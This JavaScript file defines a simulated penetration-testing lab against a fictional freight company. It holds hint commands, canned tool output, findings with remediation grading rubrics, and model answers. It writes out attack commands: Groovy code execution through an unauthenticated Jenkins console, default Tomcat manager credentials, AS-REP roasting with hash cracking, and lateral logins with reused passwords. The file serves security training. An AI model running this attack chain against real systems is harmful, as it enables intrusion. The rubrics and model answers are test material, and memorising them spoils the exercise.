// CPTC hands-on target #3: "Lakeshore Logistics" - a fictional regional freight/shipping company running its own
// DevOps tooling, a shipment-tracking API and an internal Windows domain. Same shape as CPTC_LAB / CPTC_LAB_2
// (see cptcLabScenario.js / cptcLabScenario2.js): the player TYPES recon and exploitation commands in the Kali
// terminal to discover each weakness, then writes the report. Everything is fiction - RFC 5737 (203.0.113.0/24
// here reused as 198.51.100.0/24 is taken by Meridian, so Lakeshore uses 203.0.113.0/24 for external hosts and
// RFC 1918 (10.30.0.0/16) for the internal domain), *.example (RFC 2606) hosts, canned output, nothing executed.
//
// Each finding carries `discover` (command patterns, matched case-insensitively against the LOWERCASED typed line;
// all patterns in a group must match, any group may match) and `reveal` (canned output). Findings are tried in
// order, so each one is keyed to its own host to keep commands from colliding.

import { RAW_3 } from './cptcRaw3.js';

export const CPTC_LAB_3 = {
  raw: RAW_3,
  id: 'lakeshore-logistics-2026',
  client: 'Lakeshore Logistics',
  engagement: 'External + internal network and application penetration test, one week, remote.',
  clockSeconds: 600,
  prompt: 'assessor@kali:~$',
  hints: [
    'nmap -sV -p- 203.0.113.0/24',
    'curl -s http://ci.lakeshore-freight.example:8080',
    'snmpwalk -v2c -c public 203.0.113.70',
    'curl -s "https://track.lakeshore-freight.example/api/shipments/10492"',
    'curl -u tomcat:s3cret http://ops.lakeshore-freight.example:8080/manager/text/list',
    'impacket-GetNPUsers LAKESHORE.example/ -usersfile users.txt -no-pass -dc-ip 10.30.0.10',
  ],
  complete: ['nmap', 'curl', 'snmpwalk', 'gobuster', 'impacket-getnpusers', 'hashcat', 'help', 'scope', 'found', 'clear'],
  scope: [
    'In scope: the 203.0.113.0/24 external range, *.lakeshore-freight.example, and the LAKESHORE.example internal domain (10.30.0.0/16).',
    'Out of scope: the carrier EDI gateway and any third-party customs broker system. No denial-of-service and no modifying real shipment records.',
    'Objective: find and prove the exploitable weaknesses, then report them. Do NOT exfiltrate real customer shipment data - minimal, redacted proof only (a build log excerpt, a file listing, or one record).',
    'Rules of engagement: testing windows 07:00-19:00 ET; stop and call the client contact if you see evidence of an existing intruder.',
  ],

  recon: [
    { match: [[/nmap/, /203\.0\.113/]], output: [
      'Starting Nmap 7.94 ( https://nmap.org )',
      'Nmap scan report for ci.lakeshore-freight.example (203.0.113.65)',
      '  8080/tcp open  http            <- Jenkins build server',
      'Nmap scan report for track.lakeshore-freight.example (203.0.113.68)',
      '  443/tcp  open  https           <- shipment-tracking API (JSON)',
      'Nmap scan report for switch-mgmt.lakeshore-freight.example (203.0.113.70)',
      '  161/udp  open  snmp            <- warehouse network switch',
      'Nmap scan report for ops.lakeshore-freight.example (203.0.113.72)',
      '  8080/tcp open  http            <- Apache Tomcat (ops console)',
      'Nmap scan report for vpn.lakeshore-freight.example (203.0.113.75)',
      '  443/tcp  open  https           <- site-to-site VPN portal',
      'Nmap done: 256 IP addresses (5 hosts up) scanned',
      'Next: dig into each host - the Jenkins build server, the switch SNMP agent, the tracking API, and the Tomcat manager.',
    ] },
    { match: ['subfinder', 'amass', [/dig|dnsrecon|fierce|dnsenum/, /lakeshore/]], output: [
      'DNS enumeration for lakeshore-freight.example:',
      '  ci.lakeshore-freight.example          203.0.113.65',
      '  track.lakeshore-freight.example       203.0.113.68',
      '  switch-mgmt.lakeshore-freight.example 203.0.113.70',
      '  ops.lakeshore-freight.example         203.0.113.72',
      '  vpn.lakeshore-freight.example          203.0.113.75',
      'Next: fingerprint each service with a purpose-built tool.',
    ] },
    { match: [[/whatweb|wafw00f|httpx/, /lakeshore|203\.0\.113/]], output: [
      'Fingerprint: ci.lakeshore-freight.example   Jenkins 2.4xx, /script console reachable without login.',
      'Fingerprint: track.lakeshore-freight.example nginx, JSON REST, API key header, paths under /api/.',
      'Fingerprint: ops.lakeshore-freight.example   Apache Tomcat/9, /manager/html present.',
      'Next: dig into each service with a purpose-built tool.',
    ] },
    { match: [[/nmap/, /10\.30\.0/], [/nmap/, /lakeshore\.example/], 'enum4linux', 'crackmapexec', 'netexec'], output: [
      'Internal sweep (LAKESHORE.example / 10.30.0.0/16):',
      '  10.30.0.10  lakeshore-dc01   389/tcp open  ldap   (Domain Controller)',
      '  10.30.0.25  wms01            445/tcp open  microsoft-ds  (warehouse mgmt server)',
      'Next: enumerate the domain for AS-REP-roastable accounts, then check for password reuse against wms01.',
    ] },
  ],

  findings: [
    {
      id: 'jenkins-script-console', title: 'Jenkins build server exposes an unauthenticated Script Console (RCE)', system: 'CI/CD / ci.lakeshore-freight.example',
      category: 'Unauthenticated remote code execution',
      discover: [
        [/curl|nmap|whatweb/, /ci\.lakeshore-freight|203\.0\.113\.65(?!\d)/],
        [/curl/, /\/script\b/],
      ],
      reveal: [
        'curl -s http://ci.lakeshore-freight.example:8080/script  ->  200 OK, "Script Console" (Groovy) textarea, no login.',
        'curl -s -d \'script=println "id: " + "whoami".execute().text\' http://ci.lakeshore-freight.example:8080/scriptText  -> 200 OK',
        '  id: lakeshore-build-svc   (the Jenkins service account, with code-execution rights on the build agent)',
        'Confirmed with a harmless whoami only; did NOT pivot further from the console.',
      ],
      evidence: 'The /script console on the internet-facing Jenkins master accepts arbitrary Groovy with no authentication, which is equivalent to remote code execution as the Jenkins service account.',
      businessImpact: 'Jenkins holds the credentials to deploy to every one of Lakeshore\'s environments. Unauthenticated RCE here is a direct path to the production tracking API, the warehouse systems, and the source code for all of them.',
      refLikelihood: 'High', refImpact: 'High',
      remediationRubric: {
        need: [
          { label: 'require authentication and authorization on Jenkins (disable anonymous read/script access)', re: /(require|enable|turn on|enforce)[^.]{0,40}(auth|login|sso)|disabl(e|ed|ing)[^.]{0,40}(anonymous|script console|public)/i },
          { label: 'take the build server off the internet (VPN/allow-list only)', re: /vpn|internal(ly)?|allow-?list|off the internet|not (be )?(exposed|internet)/i },
          { label: 'rotate credentials stored in Jenkins and audit build logs for misuse', re: /rotat|credential|secret|audit|build log|review (the )?logs/i },
        ],
        wrong: [
          { label: 'renaming or moving the script console URL is obscurity', re: /renam(e|ing)|hidden url|obscur|move the (console|endpoint)/i },
        ],
      },
      modelRemediation: 'Require authentication on Jenkins and disable anonymous script-console/read access, take the build server off the public internet and put it behind a VPN or allow-list, and rotate every credential Jenkins holds while auditing build logs for misuse. Hiding the console URL is not a fix.',
    },
    {
      id: 'snmp-public', title: 'Warehouse network switch answers to the default SNMP community string', system: 'Network / switch-mgmt.lakeshore-freight.example',
      category: 'Default credentials',
      discover: [
        [/snmp|snmpwalk|onesixtyone/, /public|161|203\.0\.113\.70|switch/],
      ],
      reveal: [
        'snmpwalk -v2c -c public 203.0.113.70  ->  responds. Community "public" (default) accepted.',
        'SNMPv2-MIB::sysDescr.0 = Cisco IOS switch, warehouse-core-01',
        'IF-MIB table dumps VLAN layout, trunk ports, and the IP of every connected warehouse scanner/handheld.',
        'Leaks the full network topology - a useful map for an attacker planning lateral movement.',
      ],
      evidence: 'The warehouse core switch responds to the "public" SNMP community over the internet, leaking VLAN layout, trunk ports, and connected device IPs.',
      businessImpact: 'This hands an attacker a detailed network map of the warehouse floor with no credentials needed, making follow-on lateral movement and device targeting much faster.',
      refLikelihood: 'Medium', refImpact: 'Medium',
      remediationRubric: {
        need: [
          { label: 'change or disable the default community string (or move to SNMPv3)', re: /(chang|disabl|rotat|remov|replac|turn off)[^.]{0,40}(community|snmp|public)|snmp ?v3/i },
          { label: 'take SNMP off the internet / restrict management access', re: /off the internet|not (be )?(exposed|internet)|restrict[^.]{0,30}(management|access|snmp)|management vlan|out-?of-?band/i },
        ],
        wrong: [
          { label: 'replacing the switch is unnecessary - it is a config problem', re: /replac(e|ing) (the )?switch|new switch(es)?|buy/i },
        ],
      },
      modelRemediation: 'Change or disable the default SNMP community string (move to SNMPv3) and take switch management off the public internet, restricting it to an out-of-band management network. Replacing the hardware is unnecessary; it is a configuration fix.',
    },
    {
      id: 'tracking-idor', title: 'Shipment-tracking API returns any shipment to any API key (broken object-level authorization)', system: 'API / track.lakeshore-freight.example',
      category: 'Broken access control (OWASP API1)',
      discover: [
        [/curl|ffuf|httpie|burp|wfuzz/, /track\.lakeshore-freight|203\.0\.113\.68|\/api\/shipments/],
        [/curl|ffuf|httpie/, /idor|shipments\/\d/],
      ],
      reveal: [
        'GET /api/shipments/10491   (API key issued for shipment 10490)  ->  200 OK.',
        'GET /api/shipments/10492   ->  200 OK; returned another customer\'s origin/destination and manifest contents.',
        'The API checks that the key is valid but never that the shipment belongs to the key\'s customer. IDs are sequential.',
        'Minimal proof only: two test shipments, one record each, redacted.',
      ],
      evidence: "Changing the shipment ID in the URL returns another customer's tracking record; the API validates the key but not ownership. Shipment IDs are sequential and guessable.",
      businessImpact: "Any customer (or anyone who signs up for a tracking key) can enumerate every shipment Lakeshore has ever carried, including manifests for other companies' freight - a confidentiality breach and a contract liability issue.",
      refLikelihood: 'High', refImpact: 'High',
      remediationRubric: {
        need: [
          { label: 'enforce object-level authorization (ownership) server-side on every request', re: /object[- ]level|ownership|owns|authori[sz]ation (check|on every|per|server)|server-side (authori[sz]|access|check)|access control/i },
          { label: 'use unpredictable IDs (UUIDs) as defence in depth', re: /uuid|guid|unpredictable|non-?sequential|random(ized)? (id|identifier)/i },
          { label: 'add authorization regression tests / monitoring for enumeration', re: /automated test|regression|unit test|monitor|alert|rate[- ]limit|log(ging)?/i },
        ],
        wrong: [
          { label: 'hiding or not documenting the endpoint is obscurity', re: /hid(e|ing)|obscur|undocument|secret url/i },
          { label: 'a client-side / front-end check can be bypassed by calling the API directly', re: /client-side|front-?end check|hide the (button|link)/i },
        ],
      },
      modelRemediation: 'Enforce object-level authorization server-side on every request - the caller must own the shipment - and replace sequential IDs with unpredictable UUIDs as defence in depth. Add automated authorization regression tests and monitoring for enumeration. Hiding the endpoint is not a fix.',
    },
    {
      id: 'tomcat-default-creds', title: 'Tomcat Manager accepts default credentials, allowing a WAR upload (remote code execution)', system: 'Web / ops.lakeshore-freight.example',
      category: 'Default credentials / remote code execution',
      discover: [
        [/curl|hydra|medusa|ffuf|nuclei|httpie|patator/, /ops\.lakeshore-freight|203\.0\.113\.72(?!\d)|tomcat|manager/],
      ],
      reveal: [
        'curl -u tomcat:s3cret http://ops.lakeshore-freight.example:8080/manager/text/list  ->  200 OK',
        '  OK - Listed applications for virtual host localhost',
        '  /:running:0:ROOT',
        'The vendor-default credentials tomcat:s3cret are still active and hold the "manager-script" role.',
        'A manager-script session can deploy a WAR file, which is remote code execution on this host.',
        'Confirmed access only; did NOT deploy a WAR or webshell.',
      ],
      evidence: 'The Tomcat Manager application accepts the default credentials tomcat:s3cret, which hold the manager-script role and can deploy a WAR file - remote code execution on the ops host.',
      businessImpact: 'Deploying a WAR through Manager is a one-command path to full code execution on a server that talks to internal warehouse systems, making this a direct pivot point into the internal network.',
      refLikelihood: 'High', refImpact: 'High',
      remediationRubric: {
        need: [
          { label: 'change the default Tomcat Manager credentials to a unique strong one', re: /(chang|rotat|reset|replac|remov|disabl)[^.]{0,40}(default|tomcat|password|credential)|unique[^.]{0,20}password/i },
          { label: 'restrict Manager to localhost/VPN, not the public internet', re: /vpn|internal(ly)?|localhost|allow-?list|restrict[^.]{0,40}(access|network|ip)|not (be )?(exposed|internet)/i },
          { label: 'remove unused manager roles / least privilege for the account', re: /least[- ]privilege|remov(e|ing) (the )?(manager|role)|disable manager|unused role/i },
        ],
        wrong: [
          { label: 'renaming the manager path is obscurity, not access control', re: /renam(e|ing) (the )?(manager|path|url)|obscur/i },
        ],
      },
      modelRemediation: 'Change the default Tomcat Manager credentials to a unique strong password, restrict the Manager application to localhost or a VPN rather than the public internet, and remove unused manager roles so the account has least privilege. Renaming the manager URL is not a fix.',
    },
    {
      id: 'asrep-roast', title: 'A domain account has Kerberos pre-authentication disabled (AS-REP roastable)', system: 'Active Directory / LAKESHORE.example',
      category: 'Weak Kerberos configuration',
      discover: [
        [/impacket|getnpusers|getnpusers\.py/, /lakeshore|10\.30\.0\.10|dc-ip/],
        [/hashcat/, /18200|asrep/],
      ],
      reveal: [
        'impacket-GetNPUsers LAKESHORE.example/ -usersfile users.txt -no-pass -dc-ip 10.30.0.10',
        '  $krb5asrep$23$svc-wms@LAKESHORE.EXAMPLE:... (hash captured, no domain credentials used)',
        '  User svc-wms does not require Kerberos pre-authentication.',
        'hashcat -m 18200 asrep.hash wordlist.txt  ->  cracked in the lab in minutes: password was the company name + year.',
        'Did NOT use the cracked password against any live system; reported the finding only.',
      ],
      evidence: 'The service account svc-wms has "Do not require Kerberos preauthentication" set, letting any domain-reachable attacker request and crack its AS-REP hash offline with no prior credentials. The password cracked in minutes in the lab.',
      businessImpact: 'Any device on the warehouse network can harvest this hash anonymously and crack it offline. Because it is a service account, the resulting password likely grants a direct foothold on the warehouse management server.',
      refLikelihood: 'Medium', refImpact: 'High',
      remediationRubric: {
        need: [
          { label: 're-enable Kerberos pre-authentication for the account', re: /(re-?enabl|requir|turn on)[^.]{0,40}(pre-?auth|preauthentication)/i },
          { label: 'set a long, random, unique password (and rotate it)', re: /(long|random|unique|strong|complex)[^.]{0,30}password|rotat|reset the password/i },
          { label: 'use a managed service account (gMSA) instead of a static password', re: /\bgmsa\b|managed service account|group managed/i },
        ],
        wrong: [
          { label: 'disabling the account entirely may break the service it supports - weigh that, do not just disable', re: /disable the account|delete the account/i, unless: /after|once|replac|migrat/i },
        ],
      },
      modelRemediation: 'Re-enable Kerberos pre-authentication on the svc-wms account, set a long random password and rotate it, and migrate the account to a group managed service account (gMSA) so the password is managed automatically rather than static and crackable.',
    },
    {
      id: 'password-reuse-lateral', title: 'Cracked service-account password is reused for local admin on the warehouse management server', system: 'Internal / wms01 (10.30.0.25)',
      category: 'Password reuse / lateral movement',
      discover: [
        [/crackmapexec|netexec|cme/, /wms01|10\.30\.0\.25|svc-wms/],
        [/psexec|wmiexec|smbexec/, /wms01|10\.30\.0\.25/],
      ],
      reveal: [
        'crackmapexec smb 10.30.0.25 -u svc-wms -p \'<cracked-asrep-password>\'  ->  [+] LAKESHORE.example\\svc-wms:*** (Pwn3d!)',
        'The cracked AS-REP password is the LOCAL ADMINISTRATOR password on wms01, the warehouse management server.',
        'Logged the admin shell banner only; did NOT execute commands beyond a whoami proof.',
      ],
      evidence: 'The password cracked from the svc-wms AS-REP hash is also the local administrator password on wms01. This chains the Kerberos finding directly into full control of the warehouse management server.',
      businessImpact: 'This completes a realistic attack chain from an anonymous network position to administrative control of the system that drives warehouse operations, with no phishing and no exploit beyond password cracking and reuse.',
      refLikelihood: 'Medium', refImpact: 'High',
      remediationRubric: {
        need: [
          { label: 'unique local admin passwords per machine (e.g. LAPS)', re: /\blaps\b|unique (local )?(admin|administrator) password|per[- ](machine|host|device)/i },
          { label: 'stop reusing service-account passwords for local admin', re: /(stop|do not|don.?t|never)[^.]{0,30}reus|separate (the )?(password|account|credential)/i },
          { label: 'rotate the compromised password and audit for its use elsewhere', re: /rotat|reset|audit|review (the )?(use|logins|access)/i },
        ],
        wrong: [
          { label: 'rebuilding or reimaging the single server does not fix password reuse everywhere else', re: /reimag|rebuild the server|reinstall windows/i, unless: /in addition|as well|also/i },
        ],
      },
      modelRemediation: 'Deploy unique, randomized local administrator passwords per machine (e.g. Microsoft LAPS), stop reusing service-account passwords for local admin accounts, and rotate the compromised password while auditing where else it was used. Reimaging one server does not fix password reuse across the fleet.',
    },
  ],

  execRubric: {
    need: [
      { label: 'business risk in plain language (customer shipment data / breach / operations)', re: /customer|shipment|breach|operations|warehouse|reputation|business/i },
      { label: 'names the exposed Jenkins / build server RCE', re: /jenkins|build server|script console|ci\/cd/i },
      { label: "names the API letting customers see other customers' shipments", re: /\bapi\b|other customers|shipment data|authori[sz]ation|idor|tracking/i },
      { label: 'a timeframe (e.g. within 48 hours)', re: /\b\d+\s*(hours?|days?|weeks?)\b|immediately|this week|within/i },
      { label: 'the action and the outcome once fixed', re: /(once|after|when)[^.]{0,50}(fix|remediat|closed|done|address)|reduc|lower(s|ed)? the risk|recommend/i },
    ],
    wrong: [
      { label: 'jargon the board cannot act on (ports, CVSS, CVE ids)', re: /cvss|\/tcp\b|port \d{2,5}|cve-\d|krb5asrep/i },
    ],
  },
  execModel: "Lakeshore faces a high risk of an operational breach and a customer-data incident. Two critical issues need action: an internet-facing Jenkins build server allows unauthenticated remote code execution, and the shipment-tracking API lets any customer view other customers' shipments. We recommend closing both within 48 hours; once fixed, the risk of a build-pipeline compromise or a shipment-data leak drops sharply. The remaining items - an exposed SNMP switch, default Tomcat Manager credentials, an AS-REP-roastable service account, and its reuse as local admin on the warehouse server - chain together into a full internal compromise and should follow on a 30-day plan.",
};

export default CPTC_LAB_3;
